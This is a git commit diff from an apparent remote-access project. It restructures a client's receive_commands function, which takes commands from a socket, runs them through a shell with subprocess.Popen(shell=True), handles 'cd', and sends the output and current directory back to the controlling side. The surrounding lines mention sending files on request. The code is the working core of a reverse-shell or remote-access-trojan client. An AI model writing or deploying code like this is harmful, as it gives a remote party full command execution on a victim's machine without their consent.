e68bca9f869408729aaba34b39858260c00f1d38
wi6n3l <35975131+wi6n3l@users.noreply.github.com>
2019-10-15 23:09:30 +0100

    Corrected some bad errors
    Corrected some bad errors

--- Single_Client/client.py
+++ Single_Client/client.py
@@ -48,14 +48,15 @@ def receive_commands():
                         file_name = file_name.split("#", 1)[1]
                         send_file(file_name)
                     break
-        if data[:2].decode("utf-8") == 'cd':
-            os.chdir(data[3:].decode("utf-8"))
-        if len(data) > 0:
-            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            output_bytes = cmd.stdout.read() + cmd.stderr.read()
-            output_str = str(output_bytes, "utf-8")
-            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-            print(output_str)
+        else:
+            if data[:2].decode("utf-8") == 'cd':
+                os.chdir(data[3:].decode("utf-8"))
+            if len(data) > 0:
+                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                output_str = str(output_bytes, "utf-8")
+                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                print(output_str)
     s.close()
 
 
